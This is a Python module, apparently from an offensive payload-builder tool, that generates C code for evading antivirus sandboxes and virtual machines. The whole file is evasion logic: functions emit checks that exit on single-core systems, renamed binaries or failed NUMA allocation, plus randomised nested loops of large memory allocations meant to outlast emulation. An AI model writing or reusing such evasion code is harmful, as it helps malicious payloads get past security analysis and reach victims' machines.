from lib import core
import random


# Add Anti-VM code
def THE_GREAT_EVASION(FILENAME):
    core.ADDING_EVASION()

    EVASION = ""
    EVASION += NUMBER_OF_CORE()
    EVASION += MY_NAME_IS(FILENAME)
    EVASION += DOG_CAT_OR_RAT()
    EVASION += MONO_CORE()
    EVASION += HARD_USAGE()

    core.EVASION_ADDED()

    return EVASION


def NUMBER_OF_CORE():
    # Check number of core
    SYSGUIDE = core.VARNAME_CREATOR()
    CORE = core.VARNAME_CREATOR()
    EVASION = "SYSTEM_INFO " + SYSGUIDE + ";\n"
    EVASION += "GetSystemInfo(&" + SYSGUIDE + ");\n"
    EVASION += "int " + CORE + " = " + SYSGUIDE + ".dwNumberOfProcessors;\n"
    EVASION += "if (" + CORE + " < 2){exit(0);}\n\n"

    return EVASION


def MY_NAME_IS(FILENAME):
    # Check if the begin name is the same
    B = core.VARNAME_CREATOR()
    FILENAME = FILENAME.replace('output/', '')
    EVASION = 'if (strstr(argv[0], "' + FILENAME + '") > 0){int ' + B + ' = 0;}\n'
    EVASION += "else{exit(0);}\n\n"

    return EVASION


def MONO_CORE():
    # AV have no multiproc
    MEM2 = core.VARNAME_CREATOR()
    EVASION = "LPVOID " + MEM2 + "= NULL;\n"
    EVASION += MEM2 + " = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);\n"
    EVASION += "if (" + MEM2 + " != NULL){\n"
    EVASION += 'printf("Hello World");}\n'
    EVASION += "else{exit(0);}\n\n"

    return EVASION


def HARD_USAGE():
    # Fake cpu/mem operation
    OP1 = core.VARNAME_CREATOR()
    OP1_VALUE = str(random.randint(6000, 8000))
    ITERATOR1 = core.VARNAME_CREATOR()
    MEM1 = core.VARNAME_CREATOR()
    MEM1_VALUE = str(random.randint(45000000, 60000000))
    EVASION = "int " + OP1 + "= " + OP1_VALUE + ";\n"
    EVASION += "int " + ITERATOR1 + " = 0;\n"
    EVASION += "for (" + ITERATOR1 + " = 0; " + ITERATOR1 + " < " + OP1 + "; " + ITERATOR1 + "++){\n"
    EVASION += 'printf("%d\\n", ' + ITERATOR1 + ');\n'
    EVASION += "char * " + MEM1 + " = NULL;\n"
    EVASION += MEM1 + " = (char * )malloc(" + MEM1_VALUE + ");\n"
    EVASION += "if (" + MEM1 + " != NULL){\n"
    EVASION += "memset(" + MEM1 + ", 00, " + MEM1_VALUE + ");\n"
    EVASION += "free(" + MEM1 + ");}\n"
    EVASION += "else{exit(0);}}\n"
    EVASION += "if (" + ITERATOR1 + " != " + OP1 + "){\n"
    EVASION += "exit(0);}\n\n"

    return EVASION

def DOG_CAT_OR_RAT():
    # back to first while :) EZ
    EVASION = ""

    MINIMUM_NUMBER = core.VARNAME_CREATOR()
    MINIMUM_NUMBER_VALUE = str(random.randint(3000, 4000))
    EVASION += "int " + MINIMUM_NUMBER + " = " + MINIMUM_NUMBER_VALUE + ";\n"

    MAX_NUMBER = core.VARNAME_CREATOR()
    MAX_NUMBER_VALUE = str(random.randint(5000, 6000))
    EVASION += "int " + MAX_NUMBER + " = " + MINIMUM_NUMBER_VALUE + ";\n"

    COUNT_0 = core.VARNAME_CREATOR()
    STOCK_0 = core.VARNAME_CREATOR()
    EVASION += "int " + COUNT_0 + " = 0;\n"
    EVASION += "int " + STOCK_0 + " = rand() % (" + MAX_NUMBER_VALUE + " + 1 - " + MINIMUM_NUMBER_VALUE + ") + " + MINIMUM_NUMBER_VALUE + ";\n"

    COUNT_1 = core.VARNAME_CREATOR()
    STOCK_1 = core.VARNAME_CREATOR()
    EVASION += "int " + COUNT_1 + " = 0;\n"
    EVASION += "int " + STOCK_1 + " = rand() % (" + MAX_NUMBER_VALUE + " + 1 - " + MINIMUM_NUMBER_VALUE + ") + " + MINIMUM_NUMBER_VALUE + ";\n"

    COUNT_2 = core.VARNAME_CREATOR()
    STOCK_2 = core.VARNAME_CREATOR()
    EVASION += "int " + COUNT_2 + " = 0;\n"
    EVASION += "int " + STOCK_2 + " = rand() % (" + MAX_NUMBER_VALUE + " + 1 - " + MINIMUM_NUMBER_VALUE + ") + " + MINIMUM_NUMBER_VALUE + ";\n"

    COUNT_3 = core.VARNAME_CREATOR()
    STOCK_3 = core.VARNAME_CREATOR()
    EVASION += "int " + COUNT_3 + " = 0;\n"
    EVASION += "int " + STOCK_3 + " = rand() % (" + MAX_NUMBER_VALUE + " + 1 - " + MINIMUM_NUMBER_VALUE + ") + " + MINIMUM_NUMBER_VALUE + ";\n"

    COUNT_4 = core.VARNAME_CREATOR()
    STOCK_4 = core.VARNAME_CREATOR()
    EVASION += "int " + COUNT_4 + " = 0;\n"
    EVASION += "int " + STOCK_4 + " = rand() % (" + MAX_NUMBER_VALUE + " + 1 - " + MINIMUM_NUMBER_VALUE + ") + " + MINIMUM_NUMBER_VALUE + ";\n"

    COUNT_5 = core.VARNAME_CREATOR()
    STOCK_5 = core.VARNAME_CREATOR()
    EVASION += "int " + COUNT_5 + " = 0;\n"
    EVASION += "int " + STOCK_5 + " = rand() % (" + MAX_NUMBER_VALUE + " + 1 - " + MINIMUM_NUMBER_VALUE + ") + " + MINIMUM_NUMBER_VALUE + ";\n"

    NUMBER_0 = core.VARNAME_CREATOR()
    EVASION += "int " + NUMBER_0 + ";\n"

    NUMBER_1 = core.VARNAME_CREATOR()
    EVASION += "int " + NUMBER_1 + ";\n"

    NUMBER_2 = core.VARNAME_CREATOR()
    EVASION += "int " + NUMBER_2 + ";\n"

    NUMBER_3 = core.VARNAME_CREATOR()
    EVASION += "int " + NUMBER_3 + ";\n"

    NUMBER_4 = core.VARNAME_CREATOR()
    EVASION += "int " + NUMBER_4 + ";\n"

    NUMBER_5 = core.VARNAME_CREATOR()
    EVASION += "int " + NUMBER_5 + ";\n"

    MEM_VALUE_MINIMUM = str(20000000)
    MEM_VALUE_MAXIMUM = str(30000000)

    AMMALOC_0 = core.VARNAME_CREATOR()
    AMMALOC_1 = core.VARNAME_CREATOR()
    AMMALOC_2 = core.VARNAME_CREATOR()
    AMMALOC_3 = core.VARNAME_CREATOR()
    AMMALOC_4 = core.VARNAME_CREATOR()
    AMMALOC_5 = core.VARNAME_CREATOR()

    MEM_0 = core.VARNAME_CREATOR()
    MEM_1 = core.VARNAME_CREATOR()
    MEM_2 = core.VARNAME_CREATOR()
    MEM_3 = core.VARNAME_CREATOR()
    MEM_4 = core.VARNAME_CREATOR()
    MEM_5 = core.VARNAME_CREATOR()

    EVASION += "while (" + COUNT_0 + " != " + STOCK_0 + "){\n"
    EVASION += COUNT_0 + "++;\n"
    EVASION += "int " + NUMBER_0 + ";\n"
    EVASION += NUMBER_0 + " = rand() % (" + MAX_NUMBER_VALUE + " + 1 - " + MINIMUM_NUMBER_VALUE + ") + " + MINIMUM_NUMBER_VALUE + ";\n"
    EVASION += "int " + AMMALOC_0 + " = rand() % (" + MEM_VALUE_MAXIMUM + " + 1 - " + MEM_VALUE_MINIMUM + ") + " + MEM_VALUE_MINIMUM + ";\n"
    EVASION += "char *" + MEM_0 + " = NULL;\n"
    EVASION += MEM_0 + " = (char *)\n"
    EVASION += "malloc(" + AMMALOC_0 + ");\n"
    EVASION += "if (" + MEM_0 + " != NULL){\n"
    EVASION += "memset(" + MEM_0 + ", 00, " + AMMALOC_0 + ");\n"
    EVASION += "free(" + MEM_0 + ");}else{exit(0);}\n"

    EVASION += "while (" + COUNT_1 + " != " + STOCK_0 + "){\n"
    EVASION += COUNT_1 + "++;\n"
    EVASION += "int " + NUMBER_1 + ";\n"
    EVASION += NUMBER_1 + " = rand() % (" + MAX_NUMBER_VALUE + " + 1 - " + MINIMUM_NUMBER_VALUE + ") + " + MINIMUM_NUMBER_VALUE + ";\n"
    EVASION += "int " + AMMALOC_1 + " = rand() % (" + MEM_VALUE_MAXIMUM + " + 1 - " + MEM_VALUE_MINIMUM + ") + " + MEM_VALUE_MINIMUM + ";\n"
    EVASION += "char *" + MEM_1 + " = NULL;\n"
    EVASION += MEM_1 + " = (char *)\n"
    EVASION += "malloc(" + AMMALOC_1 + ");\n"
    EVASION += "if (" + MEM_1 + " != NULL){\n"
    EVASION += "memset(" + MEM_1 + ", 00, " + AMMALOC_1 + ");\n"
    EVASION += "free(" + MEM_1 + ");}else{exit(0);}\n"

    EVASION += "while (" + COUNT_2 + " != " + STOCK_2 + "){\n"
    EVASION += COUNT_2 + "++;\n"
    EVASION += "int " + NUMBER_2 + ";\n"
    EVASION += NUMBER_2 + " = rand() % (" + MAX_NUMBER_VALUE + " + 1 - " + MINIMUM_NUMBER_VALUE + ") + " + MINIMUM_NUMBER_VALUE + ";\n"
    EVASION += "int " + AMMALOC_2 + " = rand() % (" + MEM_VALUE_MAXIMUM + " + 1 - " + MEM_VALUE_MINIMUM + ") + " + MEM_VALUE_MINIMUM + ";\n"
    EVASION += "char *" + MEM_2 + " = NULL;\n"
    EVASION += MEM_2 + " = (char *)\n"
    EVASION += "malloc(" + AMMALOC_2 + ");\n"
    EVASION += "if (" + MEM_2 + " != NULL){\n"
    EVASION += "memset(" + MEM_2+ ", 00, " + AMMALOC_2 + ");\n"
    EVASION += "free(" + MEM_2 + ");}else{exit(0);}\n"

    EVASION += "while (" + COUNT_3 + " != " + STOCK_3 + "){\n"
    EVASION += COUNT_3 + "++;\n"
    EVASION += "int " + NUMBER_3 + ";\n"
    EVASION += NUMBER_3 + " = rand() % (" + MAX_NUMBER_VALUE + " + 1 - " + MINIMUM_NUMBER_VALUE + ") + " + MINIMUM_NUMBER_VALUE + ";\n"
    EVASION += "int " + AMMALOC_3 + " = rand() % (" + MEM_VALUE_MAXIMUM + " + 1 - " + MEM_VALUE_MINIMUM + ") + " + MEM_VALUE_MINIMUM + ";\n"
    EVASION += "char *" + MEM_3 + " = NULL;\n"
    EVASION += MEM_3 + " = (char *)\n"
    EVASION += "malloc(" + AMMALOC_3 + ");\n"
    EVASION += "if (" + MEM_3 + " != NULL){\n"
    EVASION += "memset(" + MEM_3 + ", 00, " + AMMALOC_3 + ");\n"
    EVASION += "free(" + MEM_3 + ");}else{exit(0);}\n"

    EVASION += "while (" + COUNT_4 + " != " + STOCK_4 + "){\n"
    EVASION += COUNT_4 + "++;\n"
    EVASION += "int " + NUMBER_4 + ";\n"
    EVASION += NUMBER_4 + " = rand() % (" + MAX_NUMBER_VALUE + " + 1 - " + MINIMUM_NUMBER_VALUE + ") + " + MINIMUM_NUMBER_VALUE + ";\n"
    EVASION += "int " + AMMALOC_4 + " = rand() % (" + MEM_VALUE_MAXIMUM + " + 1 - " + MEM_VALUE_MINIMUM + ") + " + MEM_VALUE_MINIMUM + ";\n"
    EVASION += "char *" + MEM_4 + " = NULL;\n"
    EVASION += MEM_4 + " = (char *)\n"
    EVASION += "malloc(" + AMMALOC_4 + ");\n"
    EVASION += "if (" + MEM_4 + " != NULL){\n"
    EVASION += "memset(" + MEM_4 + ", 00, " + AMMALOC_4 + ");\n"
    EVASION += "free(" + MEM_4 + ");}else{exit(0);}\n"

    EVASION += "while (" + COUNT_5 + " != " + STOCK_5 + "){\n"
    EVASION += COUNT_5 + "++;\n"
    EVASION += "int " + NUMBER_5 + ";\n"
    EVASION += NUMBER_5 + " = rand() % (" + MAX_NUMBER_VALUE + " + 1 - " + MINIMUM_NUMBER_VALUE + ") + " + MINIMUM_NUMBER_VALUE + ";\n"
    EVASION += "int " + AMMALOC_5 + " = rand() % (" + MEM_VALUE_MAXIMUM + " + 1 - " + MEM_VALUE_MINIMUM + ") + " + MEM_VALUE_MINIMUM + ";\n"
    EVASION += "char *" + MEM_5 + " = NULL;\n"
    EVASION += MEM_5 + " = (char *)\n"
    EVASION += "malloc(" + AMMALOC_5 + ");\n"
    EVASION += "if (" + MEM_5 + " != NULL){\n"
    EVASION += "memset(" + MEM_5 + ", 00, " + AMMALOC_5 + ");\n"
    EVASION += "free(" + MEM_5 + ");}else{exit(0);}\n"

    EVASION += "}}}}}}"

    return EVASION
